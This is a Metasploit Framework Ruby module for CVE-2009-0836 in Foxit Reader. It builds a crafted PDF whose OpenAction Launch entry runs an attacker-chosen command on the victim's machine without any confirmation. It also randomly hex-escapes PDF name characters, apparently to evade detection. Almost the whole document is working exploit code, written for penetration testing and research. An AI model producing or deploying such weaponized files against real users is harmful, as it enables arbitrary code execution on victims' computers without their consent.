##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Foxit Reader Authorization Bypass',
			'Description'    => %q{
					This module exploits a authorization bypass vulnerability in Foxit Reader
				build 1120. When a attacker creates a specially crafted pdf file containing
				a Open/Execute action, arbitrary commands can be executed without confirmation
				from the victim.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],
			'References'     =>
				[
					[ 'CVE', '2009-0836' ],
					[ 'OSVDB', '55615'],
					[ 'BID', '34035' ],
				],
			'DisclosureDate' => 'Mar 9 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf']),
				OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './data/exploits/']),
			], self.class)

	end

	def run
		exec = datastore['CMD']

		# Create the pdf
		pdf = make_pdf(exec)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack('C*')[0]
			else
				result << c
			end
		end
		result
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	def make_pdf(exec)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol

		# Randomize PDF version?
		pdf = "%%PDF-%d.%d" % [1 + rand(2), 1 + rand(5)] << eol
		pdf << "%" << RandomNonASCIIString(4) << eol
		xref << pdf.length
		pdf << ioDef(1) << nObfu("<</Type/Catalog/Outlines ") << ioRef(2) << nObfu("/Pages ") << ioRef(3) << nObfu("/OpenAction ") << ioRef(5) << ">>" << endobj
		xref << pdf.length
		pdf << ioDef(2) << nObfu("<</Type/Outlines/Count 0>>") << endobj
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Pages/Kids[") << ioRef(4) << nObfu("]/Count 1>>") << endobj
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Page/Parent ") << ioRef(3) << nObfu("/MediaBox[0 0 612 792]>>") << endobj
		xref << pdf.length
		pdf << ioDef(5) << "<</Type/Action/S/Launch/F << /F(#{exec})>>/NewWindow true\n" + ioRef(6) + ">>" << endobj
		xref << pdf.length
		pdf << endobj
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end
